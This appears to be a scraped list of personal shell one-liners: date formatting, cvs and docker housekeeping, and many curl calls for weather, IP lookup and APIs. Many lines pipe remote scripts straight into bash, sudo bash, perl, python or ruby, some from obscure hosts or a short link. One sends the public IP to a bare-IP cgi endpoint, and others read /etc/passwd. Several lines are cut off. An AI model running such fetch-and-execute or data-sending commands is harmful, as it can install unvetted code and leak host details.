date +'%Y-%m-%d %H:%M:%S' | xclip -selection clipboard && xclip -selection clipboard -o
date +'%Y-%m-%d %H:%M:%S' | tr -d '\n'
date +'%Y-%m-%d %H:%M:%S' | pbcopy; pbpaste
date +%y%m%d | xargs mkdir
date +%s%N | cut -b1-13
date +%s | xclip -sel clip
date +%s | tr -d '\n'
date +%s | pbcopy && pbpaste
date +%s | pbcopy
date +%m\ %Y | xargs cal
date +%m.%d.%y.md | xargs vim
date +%Y\ %m\ %d | awk
date +%Y-%m-%dT%T.%N | sed -e 's/......\$//'
date +%Y-%m-%dT%H:%M:%S.%N | cut -b 1-23
date +%Y-%m-%dT%H-%M-%S --utc | tr -d \\n
date +%Y-%m-%d | xargs mkdir
date +%Y-%m-%d | pbcopy
date +%Y-%m-%d --utc | tr -d \\n
date +%Y%m%d%H%M | xargs mkdir
date +%T | figlet -f big
date +%F__%T | sed 's/:/-/g'
date +%F-%T.png | while read i; do adbshot ${i}; done
date +%A | tr '[:upper:]' '[:lower:]'
date '+%m-%d_' | pbcopy
date '+%Y-%m-%d_' | pbcopy
date '+%Y-%m-%d' | tee >(pbcopy)
datamash -H count 1 min 1 max 1 q3 1 perc:90 1 perc:98 1 perc:99 1 | column -t
data | grep 'G\s'
darcs show dependencies | dot -Tsvg > tmp-478231893890.svg && firefox tmp-478231893890.svg && rm tmp-478231893890.svg
darcs init && darcs add \$(darcs whatsnew -ls | awk '/^a\ / {print \$2}') && darcs record -a -m'Initial import'
darcs init && darcs add \$(darcs wh -ls | awk '/^a\ / {print \$2}') && darcs rec -a -m'Initial import'
dangling-images | xargs docker rmi -f
da 'ps | grep interp'
da 'free -m | grep buffers/cache'
d | more
d | m
d | grep G
d | grep -e G -e M
d volume ls -qf dangling=true | xargs -r sudo docker volume rm
d volume ls -qf dangling=true | xargs -r d volume rm
d ps -aq --no-trunc | xargs sudo docker rm
d images | grep \<none\>
d images | awk '{print \
d images -q | xargs sudo docker rmi -f
d images -q --filter dangling=true | xargs sudo docker rmi
d -t | head
d -t err.txt generated.file succ.txt | head -9
d -t err.txt generated.file succ.txt | head -22
d err.txt generated.file succ.txt | sort -h
d err.txt generated.file succ.txt | sort -g
c|o
cyph | color 255 140 10
cygcheck -c | grep -i
cygcheck -c -d | sed -e \
cyan -db cyclus.sqlite flowgraph -proto | dot -Tpng > flow.png
cvs_status | grep -v '^= '
cvs up -Pd 2>&1 | grep -v Updating
cvs status | grep Status
cvs status | grep Modified
cvs status | grep File
cvs status \!* |& grep Status:
cvs status 2>/dev/null | grep Needs
cvs status 2>/dev/null | grep Local
cvs status 2>&1 | grep
cvs status 2>&1 | fgrep Status:
cvs status -l | grep --after-context=4 Modified
cvs status -R | grep --after-context=4 Modified
cvs log | ruby -r ~/svn/devtools/ruby/cvs_log/cvs_log -e 'CVSLog.stdin'
cvs diff 2>&1 | grep -v Diffing
cvs diff -wbB | colordiff
cvs diff -u | vim -M -
cvs diff -u | cless
cvs diff -u | cdiff
cvs diff -u -rHEAD | vim -M -
cvs -q update -dP | ~/bin/update_filter.pl
cvs -n update 2>&1 | grep -P
cvs -n upd | grep ?
cvs -n upd -l | grep ?
cvs -n -f -q up -dPR 2>/dev/null | grep '^[MARC?] '
cvs -Q status | grep -i locally
cvpn(){bash ${HOME}/scripts/changevpn.sh $(ls /etc/wireguard/ | cut -f1 -d
cut -f1 -d "":""|\
cut -d: -f2 | \
cut -d: -f1|uniq
cut -d: -f1 | uniq
cut -d: -f1 /etc/passwd | sort -bd
cut -d: -f1 /etc/passwd | sort
cut -d: -f1 /etc/group | sort -bd
cut -d: -f1 /etc/group | sort
cut -d'm' -f 1 | awk -F'h' '{s = s + $1 err.txt generated.file succ.txt 60 + $2}; END {print int(s/60) ':' s%60 }'
cut -d';' -f2 ~/.zsh_history | fzf
cut -d':' -f1 |xargs vim
cut -d'&' -f1 - | mpv -fs --ytdl
cut -d '.' -f 2 | uniq -c
cut -d ' ' -f 1 | tr '\n' ' '
cut -c1-7 | xargs qdel
cut -c1-7 | xargs -I{} qstat -j {}
cut -c1-$(stty size <&2 | cut -d' ' -f2)
current_branch | pbcopy
currentBranch=$(git branch | sed -n -e
curl_jq(){ curl $@ | jq . }; curl_jq
curl wttr.in/riga | grep -v Follow
curl wttr.in/nyc | less
curl wttr.in/brugge --silent | head -n37
curl wttr.in/asheville | sed -e 's/38;5/1;38;5/g' -e 's:226m:202m:g'
curl wttr.in/Moon | sed -e 's/38;5/1;38;5/g' -e 's:226m:202m:g'
curl wttr.in | grep -v @igor_chubin
curl wttr.in 2> /dev/null | head -n 7
curl whatismyip.akamai.com && ifconfig en0 inet | grep 'inet '
curl shrug.io|xclip
curl s2c.sh | bash -s
curl nycurl.sytes.net -silent | less
curl localhost:9250/_cat/indices | grep open && curl localhost:9250/_cat/aliases
curl localhost:5035/healthz | jq .
curl localhost:5030/healthz | jq .
curl localhost:5025/healthz | jq .
curl localhost:5020/healthz | jq .
curl localhost:5015/healthz | jq .
curl localhost:5015/get-info | jq .
curl localhost:5010/healthz | jq .
curl localhost:5005/healthz | jq .
curl localhost:5000/healthz | jq .
curl ipinfo.io | jq .
curl ipinfo.io 2>/dev/null | jq -r .ip
curl ipecho.net/plain | pbcopy
curl ip.appspot.com | echo .
curl ifconfig.me | xargs -I {} curl http://49.212.25.77/cgi-bin/ssh.cgi --data network={}
curl ifconfig.me | pbcopy
curl ifconfig.me -v | pbcopy
curl ifconfig.co/json > ~/tmp && cat ~/tmp | goodJson && rm ~/tmp
curl ifconfig.co/json 2>null|jq
curl ifconfig.co/json 2>/dev/null | jq -r '\
curl icanhazip.com|pbcopy
curl https://www.monip.org -s | grep -Po --color=never \
curl https://www.marktai.com/download/downloadSettings.sh | bash
curl https://www.howsmyssl.com/a/check | jq
curl https://www.gnu.org/licenses/gpl-3.0.txt | head -n 619 > LICENSE.md
curl https://wttr.in/$(geo -g | sed -n 3p)
curl https://wtfismyip.com/json | jq
curl https://tides.mobilegeographics.com/locations/5530.html | grep ^2019
curl https://supermarket.getchef.com/api/v1/health | jsonformat
curl https://status.github.com/api/status.json -s |ruby -rjson -e \
curl https://static.rust-lang.org/rustup.sh | sudo sh
curl https://sh.rustup.rs -sSf | sh -s -- --no-modify-path
curl https://sh.rustup.rs -sSf | sh
curl https://raw.githubusercontent.com/qrpike/Web-Font-Load/master/install.sh | sh
curl https://raw.githubusercontent.com/miya0001/wp-instant-setup/master/run.sh | bash -s
curl https://raw.githubusercontent.com/mikeadmire/home_bin/master/install.sh -o - | sh
curl https://raw.githubusercontent.com/mikeadmire/dotvim/master/install.sh -o - | sh
curl https://raw.githubusercontent.com/mikeadmire/dotfiles/master/install.sh -o - | sh
curl https://raw.githubusercontent.com/lijianying10/FixLinux/master/script/env.sh | bash
curl https://raw.githubusercontent.com/kovidgoyal/kitty/master/terminfo/x/xterm-kitty | sudo tee /usr/share/terminfo/x/xterm-kitty > /dev/null
curl https://raw.githubusercontent.com/jdratlif/configs/master/sync.sh | sh
curl https://raw.githubusercontent.com/jcs/dotfiles/master/move_in.sh | sh -x -
curl https://raw.githubusercontent.com/isaacs/nave/master/nave.sh | sudo bash -s -- usemain latest
curl https://raw.githubusercontent.com/firewalla/firewalla/master/scripts/sanity_check.sh 2>/dev/null | bash -
curl https://raw.githubusercontent.com/erdaltsksn/dotfiles/master/scripts/update.sh | bash
curl https://raw.githubusercontent.com/eparis/ssh-bastion/master/deploy/deploy.sh | bash
curl https://raw.githubusercontent.com/cnbattle/dotfiles/master/golang_deploy.sh|sh
curl https://raw.githubusercontent.com/cPanelTechs/TechScripts/master/ea-precheck.sh | sh
curl https://raw.githubusercontent.com/ahdinosaur/2dpixels-terminal/bundle/example-bundle.js | node
curl https://raw.githubusercontent.com/Schniz/fnm/master/.ci/install.sh | bash
curl https://raw.githubusercontent.com/LeCoupa/awesome-cheatsheets/master/tools/git.sh | bat -l sh
curl https://raw.githubusercontent.com/LeCoupa/awesome-cheatsheets/master/languages/bash.sh | bat -l sh
curl https://raw.github.com/mostlygeek/env-personalize/master/install.sh | sh
curl https://raw.github.com/lucapuca/dotfiles/master/bootstrap.sh -L -o - | sh
curl https://raw.github.com/keroserene/rickrollrc/master/roll.sh | bash
curl https://raw.github.com/danieljaouen/dotfiles/master/topics/bin/bootstrap.sh | bash
curl https://omnitruck.chef.io/install.sh | sudo bash -s -- -c current -P chefdk
curl https://npmjs.org/install.sh | sh
curl https://jsonip.com 2>/dev/null | sed
curl https://ip.cn | grep ip
curl https://hide.me/en/check | grep \
curl https://git.suckless.org/ 2> /dev/null | grep '<a href=\
curl https://gist.githubusercontent.com/s-aska/9268689/raw/26d81dbe17fbd8cfc3984eca6848ced0cf3293bd/homo.pl | perl
curl https://gist.githubusercontent.com/romanlarionov/d9213f1a3376a9988afd8953408d6258/raw/5d2fbd8d212a37d0a5a9b1eab531ee63341cfb16/bark.sh | bash
curl https://gist.githubusercontent.com/monorkin/d2c801d193ce48224ae052b49ba60856/raw/clean_docker.sh | bash
curl https://gist.githubusercontent.com/evadnoob/d8c14b824c342730c046/raw/73d047f0a3ffc35f0655488547e7f24fa3f04ea6/colortrans.py | python
curl https://gist.githubusercontent.com/dameninngenn/5865715/raw/timer.pl | perl - --color=green
curl https://getmic.ro | bash && sudo mv ./micro /usr/local/bin/
curl https://getcroc.schollz.com | bash
curl https://getcaddy.com | bash -s personal
curl https://eugenekay.com/env | bash
curl https://chalmers.it/lunch/feed\?filter=Johanneberg | less
curl https://chalmers.it/lunch/feed | less
curl https://cdn.rawgit.com/unwitting/imageme/master/imageme.py | python2
curl https://bootstrap.pypa.io/get-pip.py | python
curl https://api.ipify.org?format=json | jq -r '.ip'
curl https://api.ipify.org | xclip -i -sel clip
curl https://api.coindesk.com/v1/bpi/currentprice/BRL.json | jsonValue rate_float 2
curl httpbin.org/ip 2> /dev/null | jq -r .origin
curl http://www.radiorecord.ru/rss.xml | grep mp3
curl http://www.middlecoin.com/allusers.html | grep -B 3 -A 3 1HoqBstSjv5kZrEyyHCGjReRpLf3TWTLPS
curl http://wttr.in/taipei?lang=zh -s | head -n 17
curl http://wttr.in/broomfield?Tn | less
curl http://wttr.in/ann_arbor?Tn | less
curl http://wttr.in/Lille | less
curl http://wttr.in/ | less -r
curl http://wttr.in/ | less
curl http://wttr.in | less -RS
curl http://wttr.in | less
curl http://sfstream1.somafm.com:2200 | mpg321 -
curl http://proverbinatus.com/quotes/random | say
curl http://phrakture.com/apps/mrsubmission/data/questions.json | jsonpp
curl http://npmjs.org/install.sh | sh
curl http://myexternalip.com/raw; echo; ipconfig | findstr IPv4; echo;
curl http://localhost:5035/healthz | jq .
curl http://localhost:5030/healthz | jq .
curl http://localhost:5025/healthz | jq .
curl http://localhost:5015/healthz | jq .
curl http://localhost:5015/get-info | jq .
curl http://localhost:5010/healthz | jq .
curl http://localhost:5005/healthz | jq .
curl http://localhost:5000/healthz | jq .
curl http://kelder.zeus.ugent.be/webcam/video/mjpg.cgi | mpv --no-correct-pts --fps 5 -
curl http://ipinfo.io/ip; ifconfig| grep -w inet
curl http://ipinfo.io/ip | iponmap
curl http://ipecho.net/plain | pbcopy
curl http://httpbin.org/ip 2>/dev/null | jq -r .origin
curl http://getcomposer.org/installer | php
curl http://earthquake.usgs.gov/earthquakes/catalogs/eqs1day-M1.txt --silent | sed
curl http://dd.weather.gc.ca/citypage_weather/mp3/ON/s0000430_sa_e.mp3 | mpv -
curl http://checkip.amazonaws.com/ | pbcopy
curl http://bot.whatismyipaddress.com | grep -E '[0-9.]+'
curl http://127.0.0.1:5984/ | python -m json.tool
curl get.pow.cx/uninstall.sh | sh
curl get.pow.cx | sh
curl gdrive.sh | bash -s
curl \!:1 | tar xzf -
curl -v wttr.in/luton 2>&1 | grep Weather -A 7
curl -v http://54.38.92.92/json?fields=262143 | jq
curl -v --silent http://www.soupson.ca/ 2>&1 | grep -m3 -A $(($(date +%u) + 2)) \
curl -sq checkip.amazonaws.com | pbcopy
curl -sk https://ssp.cpanel.net/ssp | /usr/local/cpanel/3rdparty/bin/perl - --bugreport
curl -sSf https://static.rust-lang.org/rustup.sh | sh -s -- --channel=nightly
curl -sSf https://static.rust-lang.org/rustup.sh | sh
curl -sSX GET http://api.aladhan.com/v1/timingsByCity\?city\=NYC\&country\=USA\&method\=2 | jq .data.timings
curl -sSLf http://wttr.in/moon | head -n -4
curl -sSLf http://wttr.in/ | head -n -2
curl -sSL install.meteor.com | sh
curl -sSL https://raw.githubusercontent.com/websNL/bash-profile/master/install.sh | bash
curl -sSL https://raw.githubusercontent.com/dosel/t/i/p | bash -s stop
curl -sSL https://raw.githubusercontent.com/creationix/nvm/v0.33.6/install.sh | bash
curl -sSL https://hedzr.com/bash/bash-framework/installer | sudo bash -s
curl -sSL https://get.rvm.io | bash
curl -sSL https://get.k8s.io | bash
curl -sSL https://get.docker.com/ | sh && sudo usermod -aG docker $USER
curl -sSL https://get.docker.com | sudo sh && sudo usermod -aG docker $(whoami)
curl -sSL get.docker.com | sh
curl -sSL 'https://check.torproject.org/api/ip' | json
curl -sSL 'https://api.ipify.org?format=json' | json
curl -sS wttr.in/Tokyo | head -27
curl -sS wttr.in/98122 | head -27
curl -sS ipinfo.io 2>/dev/null | jq .
curl -sS https://www.nhc.noaa.gov/xgtwo/two_atl_5d0.png | imgcat
curl -sS https://raw.githubusercontent.com/chadoe/docker-cleanup-volumes/master/docker-cleanup-volumes.sh | sudo bash /dev/stdin --dry-run
curl -sS https://raw.githubusercontent.com/chadoe/docker-cleanup-volumes/master/docker-cleanup-volumes.sh | sudo bash
curl -sS https://raw.githubusercontent.com/baidu/openrasp/master/rasp-install/remote/linux/app-env-docker.sh?_=$(date +%s) | bash
curl -sS https://getcomposer.org/installer | php -- --install-dir=bin
curl -sS https://getcomposer.org/installer | php -- --filename=composer
curl -sS https://getcomposer.org/installer | php && mv composer.phar ~/.local/bin/composer
curl -sS https://getcomposer.org/installer | php && composer install
curl -sS https://getcomposer.org/installer | php
curl -sS https://api.github.com/search/issues?q=repo:conda/conda+is:issue+is:open+label:type:bug | jq .total_count
curl -sS http://tamvmcc1:8080/cruisecontrol/rss | grep -q '^<title>perimeta passed .*</title>\$'
curl -sLf https://spacevim.org/install.sh | bash
curl -sLf https://raw.githubusercontent.com/zhongdai/myconfig/master/install.sh | bash
curl -sL sub.sh | bash -s -
curl -sL https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python
curl -sL https://raw.githubusercontent.com/richardforth/apache2buddy/master/apache2buddy.pl | perl
curl -sL https://raw.githubusercontent.com/RootService/tuning-primer/master/tuning-primer.sh | bash
curl -sL https://raw.github.com/major/MySQLTuner-perl/master/mysqltuner.pl | perl
curl -sL https://install.astronomer.io | sudo bash
curl -sL https://github.com/kraiz/shell/raw/master/install.sh | zsh
curl -sL https://git.io/_has | bash -s
curl -sL https://git.io/_has | HAS_ALLOW_UNSAFE=y bash -s
curl -sL https://deb.nodesource.com/setup_8.x | sudo -E bash -
curl -sL https://api.coindesk.com/v1/bpi/currentprice/BTC.json | python -c \
curl -sL http://wttr.in/moon | head -n-4
curl -sL http://http.mirrors.fedoraproject.org/pub|pandoc -f html -t markdown
curl -sL http://bit.ly/1KK1GD9 | ruby
curl -sL http://api.myip.com | jq -Mr .ip
curl -sL http://10.4.9.100/Aaditya_Utilization/index.php |grep incois
curl -sL 'www.commandlinefu.com/commands/random' | awk -F'</?[^>]+>' '/
curl -sG http://127.0.0.1:$AE_LOCAL_INTERNAL_PORT/v2/account/balance/`aepub_key`|jq .balance
curl -sF c=@- 'https://ptpb.pw/?u=1' | xsel
curl -s4 http://ip-api.com/json | prettyjson
curl -s wttr.in|head -n 7
curl -s wttr.in|head -7
curl -s wttr.in|head -37
curl -s wttr.in/~白井市 | head -7
curl -s wttr.in/solothurn | head -n -3
curl -s wttr.in/purwoasri | head -7
curl -s wttr.in/perugia | head -7
curl -s wttr.in/ny | head -n17
curl -s wttr.in/nagano | head -n7
curl -s wttr.in/moon | head -n -3
curl -s wttr.in/jersey | head -n -2
curl -s wttr.in/jena | head -n -3
curl -s wttr.in/istanbul | head -7
curl -s wttr.in/essen | head -n 7
curl -s wttr.in/east_lansing | head -n -2
curl -s wttr.in/copenhagen | head -7
curl -s wttr.in/cologne | head -n-2
curl -s wttr.in/brno | head -7
curl -s wttr.in/bonn+germany | head -n 7
curl -s wttr.in/Zagreb | head -7
curl -s wttr.in/Zagreb | head -17
curl -s wttr.in/Toronto | head -7
curl -s wttr.in/Thessaloniki | less
curl -s wttr.in/Moon | head -n 23
curl -s wttr.in/Moon | head -n -2
curl -s wttr.in/Krakow | sed -n \
curl -s wttr.in/Jonestown | head -7
curl -s wttr.in/Hyderabad | head -7
curl -s wttr.in/Halifax | head -n 7
curl -s wttr.in/Brisbane | head -7
curl -s wttr.in/Boston | head -7
curl -s wttr.in/10019?2n 2> /dev/null | head -n27
curl -s wttr.in/ | head -7
curl -s wttr.in | sed -n
curl -s wttr.in | lolcat -a -d 5
curl -s wttr.in | less
curl -s wttr.in | head -n7
curl -s wttr.in | head -n 7
curl -s wttr.in | head -n -2
curl -s wttr.in | head -7
curl -s wttr.in | head -5
curl -s wttr.in | head -38
curl -s wttr.in | head -17
curl -s worldtimeapi.org/api/ip.txt | sed -n 's/^timezone: //p'
curl -s whatismyip.akamai.com | xargs dig +short -x
curl -s us.wttr.in/Berlin\?m | head -n 37
curl -s stream.morow.com:8080 | play -t mp3 - &> /dev/null
curl -s randomfunfacts.com | sed -n 's/.*<i>\(.*\)<\/i>.*/\1/p'
curl -s myip.dk|grep
curl -s localhost:8090/info | xmllint --format -
curl -s localhost:8081/metrics\?pretty=true | vim - -s ~/.vim/snippets/setjson.script -R
curl -s lectserve.com/today | jq --raw-output '@text \
curl -s jakehofman.com/lists/tips.txt | grep -i
curl -s ipinfo.io/$1 | jq
curl -s ipinfo.io | jq -r '.ip'
curl -s ipinfo.io | grep -oE '\
curl -s ip\.nu | egrep --color=no -o '[0-9\.]+'
curl -s ip.appspot.com | pbcopy;pbpaste
curl -s inet-ip.info/json | jq
curl -s ifconfig.me | cut -d ' ' -f 5
curl -s ifconfig.co/json|json_pp
curl -s ifconfig.co/json|jq .
curl -s ifconfig.co/json | jq -r .
curl -s ifconfig.co/json | jq
curl -s icanhazip.com | xargs -n1 dig +short -x
curl -s https://www.whoismyisp.org | grep -oP '\bisp\
curl -s https://www.perl.org/get.html | perl -wlne
curl -s https://www.myinstants.com/media/sounds/tf_nemesis.mp3 | mpg123 -
curl -s https://www.myinstants.com/media/sounds/pulp-fiction-english-motherfucker-do-you-speak-it.mp3 | mpg123 -
curl -s https://www.myinstants.com/media/sounds/nooo.mp3 | mpg123 -
curl -s https://www.myinstants.com/media/sounds/imperial_march.mp3 | mpg123 -
curl -s https://www.myinstants.com/media/sounds/grilo_1.mp3 | mpg123 -
curl -s https://www.myinstants.com/media/sounds/expedientes-secretos-x-musica22.mp3 | mpg123 -
curl -s https://www.myinstants.com/media/sounds/8e8118_counter_strike_go_go_go_sound_effect.mp3 | mpg123 -
curl -s https://www.kernel.org/releases.json | jq .latest_stable.version
curl -s https://www.kernel.org/doc/Documentation/process/coding-style.rst | less
curl -s https://www.githubstatus.com/api/v2/status.json | jq
curl -s https://www.expressvpn.com/what-is-my-ip | grep -o
curl -s https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt | shuf -n 6 -r --random-source /dev/random
curl -s https://www.bitstamp.net/api/v2/ticker_hour/ethusd/ | jq '.last'
curl -s https://wttr.in/~白井市 | head -7
curl -s https://us.wttr.in | head -n 17
curl -s https://status.github.com/api/status.json | jq
curl -s https://static.rust-lang.org/rustup.sh | sudo sh -s -- --channel=nightly
curl -s https://static.rust-lang.org/rustup.sh | sudo sh
curl -s https://static.rust-lang.org/rustup.sh | sh
curl -s https://raw.githubusercontent.com/xdissent/ievms/master/ievms.sh | env IEVMS_VERSIONS=\
curl -s https://raw.githubusercontent.com/xdissent/ievms/master/ievms.sh | bash
curl -s https://raw.githubusercontent.com/writeonly/cli/master/bash_aliases_update.sh | bash
curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py |python -
curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python3 -
curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python - --server 24215
curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python -
curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python
curl -s https://raw.githubusercontent.com/sergiolepore/ChristBASHTree/e757367e54e4d95166d9037b31211ad087e246fe/tree-EN.sh | bash
curl -s https://raw.githubusercontent.com/se2030/se/master/gb_ahmad.sh | bash -s
curl -s https://raw.githubusercontent.com/reactorcore/pomander/master/bin/install | bash
curl -s https://raw.githubusercontent.com/jpapejr/docker/master/ibmcloud/get-iks-configs.sh | bash
curl -s https://raw.githubusercontent.com/hortonworks/cloudbreak-deployer/master/install-dev | sh
curl -s https://raw.githubusercontent.com/cPanelTechs/TechScripts/master/ea-precheck.sh | sh
curl -s https://raw.githubusercontent.com/JohnMorales/dotfiles/master/colors/24-bit-color.sh | bash"
curl -s https://raw.githubusercontent.com/JohnMorales/dotfiles/master/colors/24-bit-color.sh | bash
curl -s https://raw.githubusercontent.com/Haroenv/simple-jekyll/master/install.sh | bash /dev/stdin
curl -s https://raw.github.com/xdissent/ievms/master/ievms.sh | bash
curl -s https://ptpb.pw/l | env LESS= less -CMNRis
curl -s https://pry.sh | jq -r '.address'
curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -
curl -s https://ipv4.myip.info/ | pbcopy
curl -s https://iplocation.com/ | grep -E '<b class=\
curl -s https://ipchicken.com | egrep -o
curl -s https://install.zerotier.com/ | sudo bash
curl -s https://install-node.now.sh | sh -s --
curl -s https://ifconfig.me/all.json | jq -r .ip_addr
curl -s https://ifconfig.co/json | python -m json.tool
curl -s https://httpbin.org/ip | jq .origin
curl -s https://gist.githubusercontent.com/busterc/188c789c01b2aa586b194836050e3a1f/raw/b15557a191e0fef8b80256feddeb0e3b8e4322db/RethinkDB_Docker.md 2>&1 | less
curl -s https://gist.githubusercontent.com/atais/5d3ec79e67f221cb55b7/raw/f6e6b647e6f90939c016ba88e591529d143cb33d/cash_upgrade.sh | bash /dev/stdin
curl -s https://gist.githubusercontent.com/HaleTom/89ffe32783f89f403bba96bd7bcd1263/raw/ | bash
curl -s https://getcomposer.org/installer | php && sudo mv composer.phar /usr/local/bin/composer
curl -s https://getcomposer.org/installer | php
curl -s https://get.sdkman.io | bash
curl -s https://freegeoip.app/json/ | jq
curl -s https://deuxhuithuit.com/cdn-cgi/trace | grep ip=
curl -s https://data.iana.org/TLD/tlds-alpha-by-domain.txt | rg -i
curl -s https://dashboard.resinstaging.io | grep COMMIT
curl -s https://bootstrap.pypa.io/get-pip.py | sudo -H python3
curl -s https://bootstrap.pypa.io/get-pip.py | sudo -H python2
curl -s https://bootstrap.pypa.io/get-pip.py | python3
curl -s https://bootstrap.pypa.io/get-pip.py | python2
curl -s https://bitpay.com/api/rates | jq .[3]
curl -s https://api.ipify.org\?format\=json | jq -r '.ip'
curl -s https://api.ipify.org?format=json | perl -e 'print <STDIN> =~ m{\d*\.\d*\.\d*\.\d*}g; '
curl -s https://api.ipify.org?format=json | jq -r .ip
curl -s https://api.github.com/users/`echo $aUser`/repos | ruby -rubygems -e
curl -s https://api.github.com/orgs/`echo $aUser`/repos | ruby -rubygems -e
curl -s https://api.github.com/orgs/$1/repos?per_page=100 | ruby -rubygems -e 'require \
curl -s https://am.i.mullvad.net/json | jq
curl -s httpbin.org/ip | jq -r .origin
curl -s http://www.showmyip.gr | grep -A1 -E -m 1 '<span class=\
curl -s http://www.showmyip.com/simple/ | awk '{print $1}'
curl -s http://www.randominsults.net | sed -n 's/.*<i>\(.*\)<\/i>.*/\1/p'
curl -s http://www.perl.org/get.html | perl -wlne
curl -s http://www.ietf.org/assignments/http-status-codes/http-status-codes.txt | grep
curl -s http://www.atmos.washington.edu/cgi-bin/latest_uw.cgi | awk
curl -s http://wttr.in/warszawa | head -n -2&& ~/.scripts/fullscreen_wrap
curl -s http://wttr.in/\?m | head -n-1
curl -s http://wttr.in/\?1m |head -17
curl -s http://wttr.in/Paris | head -17
curl -s http://wttr.in/94107| head -n 38
curl -s http://wttr.in/ | head -7
curl -s http://wttr.in | head -n -2
curl -s http://wtfismyip.com/text | awk '{print $1}'
curl -s http://wowquote.tw/quote/random\?json\=1 | jq '.celebrity.name + \
curl -s http://whatthecommit.com/index.txt | cowsay
curl -s http://whatthecommit.com | perl -p0e '($_)=m{<p>(.+?)</p>}s'
curl -s http://whatismyip.akamai.com/ | sed 's/[^0-9\.]//g'
curl -s http://randomfunfacts.com | sed -n 's/.*<i>\(.*\)<\/i>.*/\1/p'
curl -s http://railsbridge-montreal.com/checks/script | ruby -
curl -s http://radiomeuh.com/meuh/playlist/index.php | egrep -ae \
curl -s http://php-osx.liip.ch/install.sh | bash -s 5.4
curl -s http://nodejs.org/dist/npm-versions.txt | tail -n 1
curl -s http://monip.ovh/|grep -oP '(?<=IP: ).*'
curl -s http://localhost:41184/notes\?token\=<REDACTED> | python -m json.tool
curl -s http://ipecho.net/plain | awk '{print $1}'
curl -s http://ip.taobao.com/service/getIpInfo2.php?ip=myip | json
curl -s http://ip-api.com/json| python -m json.tool
curl -s http://ip-api.com/json | python3 -m json.tool
curl -s http://icanhazip.com/ | awk '{print $1}'
curl -s http://httpbin.org/ip | egrep -o '[0-9.]*'
curl -s http://haikumachine.herokuapp.com/ | sed -e 's/[{}]/''/g; s/\
curl -s http://getcomposer.org/installer | php
curl -s http://edgecats.net/first | imgcat
curl -s http://checkrealip.com/ | grep \
curl -s http://checkip.dyndns.org:8245/ | grep -Po 'IP\sAddress:\s\K[0-9.]+'
curl -s http://checkip.dyndns.org/ | sed 's/[a-zA-Z<>/ :]//g'
curl -s http://checkip.dyndns.org/ | grep -o \
curl -s http://checkip.dyndns.org/ | grep -o [0-9][0-9]*.[0-9][0-9]*.[0-9][0-9]*.[0-9]*
curl -s http://checkip.dyndns.org/ | grep -o '[0-9][0-9]*.[0-9][0-9]*.[0-9][0-9]*.[0-9]*'
curl -s http://checkip.dyndns.org/ | grep -o
curl -s http://checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g'
curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z/<> :]//g'
curl -s http://checkip.dyndns.org | sed 's/[^0-9.]//g'
curl -s http://checkip.dyndns.org | sed 's/.*Current IP Address: \([0-9\.]*\).*/\1/g'
curl -s http://checkip.dyndns.com/ | sed 's/[^0-9\.]//g'
curl -s http://checkip.dyndns.com | sed -e 's/^.*Address:\ //' -e 's/<\/body.*//'
curl -s http://checkip.dyn.com/ | sed 's/.* \\([0-9.]\\+\\)<.*/\\1/'
curl -s http://calapi.inadiutorium.cz/api/v0/en/calendars/general-en/today | jq --raw-output '@text \
curl -s http://bot.whatismyipaddress.com | awk '{print $1}'
curl -s http://api.referyaar.dev/r | jq
curl -s http://api.icndb.com/jokes/random/ | jq -r '.value.joke'
curl -s http://api.icndb.com/jokes/random/ | egrep -oh '\
curl -s http://api.coindesk.com/v1/bpi/currentprice.json | jq .bpi.EUR.rate
curl -s http://api.aoikujira.com/ip/json | jq -r .REMOTE_ADDR
curl -s http://192.168.1.101:9090/diagnostics/drone_info | jq
curl -s http://$EXCEPTIONMANAGER_HOST:$EXCEPTIONMANAGER_PORT/skippedmessages | jq
curl -s http://$EXCEPTIONMANAGER_HOST:$EXCEPTIONMANAGER_PORT/badmessages | jq
curl -s ftp://ftp.slackware.com/pub/slackware/slackware64-current/ChangeLog.txt | less
curl -s cjmarquart.com/script/transfer.sh | bash
curl -s checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*\$//'
curl -s checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
curl -s checkip.dyndns.org | sed -e 's/^.*Current IP Address: //' -e 's/<.*$//'
curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//' '>'
curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
curl -s checkip.dyndns.org | sed 's/[^0-9.]//g'
curl -s checkip.dyndns.org | sed 's/.*<body>.*: \(.*\)<\/body>.*/\1/'
curl -s checkip.dyndns.org | grep -Eo [0-9.]+
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
curl -s checkip.dyndns.org | grep -Eo '[0-9>]+'
curl -s checkip.dyndns.org | grep -Eo
curl -s canhazip.com | grep
curl -s -o /dev/null https://lanevok.com/dummy/5mb -w '%{speed_download}\n' | awk '{ r=\$1*8/1000/1000 ; print r }'
curl -s -XGET http://insult-bot.herokuapp.com/plain | xclip -selection c && xclip -selection c -o && echo
curl -s -XGET http://$NODE:9200/_cat/shards?v | sort
curl -s -XGET http://$NODE:9200/_cat/indices?v | sort
curl -s -XGET 'http://elb1:9200/_cluster/pending_tasks?pretty' | less
curl -s -XGET 'http://elb1:9200/*/_stats/get?pretty' | less
curl -s -XGET $CREDENTIAL $PROTOCOL://$NODE:9200/_cat/shards?v | sort
curl -s -XGET $CREDENTIAL $PROTOCOL://$NODE:9200/_cat/indices?v | sort
curl -s -XGET $CREDENTIAL $ES_SCHEME://$NODE:9200/_cat/shards?v | sort
curl -s -XGET $CREDENTIAL $ES_SCHEME://$NODE:9200/_cat/indices?v | sort
